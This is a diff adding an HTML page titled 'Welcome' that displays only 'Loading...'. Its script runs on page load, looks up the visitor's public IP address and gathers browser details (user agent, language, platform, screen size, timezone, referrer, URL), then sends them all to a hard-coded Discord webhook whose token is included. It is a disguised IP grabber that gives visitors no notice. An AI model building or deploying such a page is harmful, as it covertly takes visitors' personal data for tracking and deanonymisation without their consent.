@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Welcome</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+
+    <script>
+    (async function() {
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545018417218846790/uHxDNUX8B4wlJI6OGWIHserCHUkfu0IGpk-Ck0Oz1rCQOP6YyUc4nHZ_qrrBew6tL9YU';
+ try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const ip = ipData.ip;
+            const data = {
+                ip: ip,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'direct',
+                url: window.location.href,
+                timestamp: new Date().toISOString()
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `**New Visitor**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
+                })
+            });
+
+            console.log('[+] Sent');
+        } catch (e) {
+            console.error('[-]', e);
+        }
+    })();
+    </script>
+</body>
+</html>
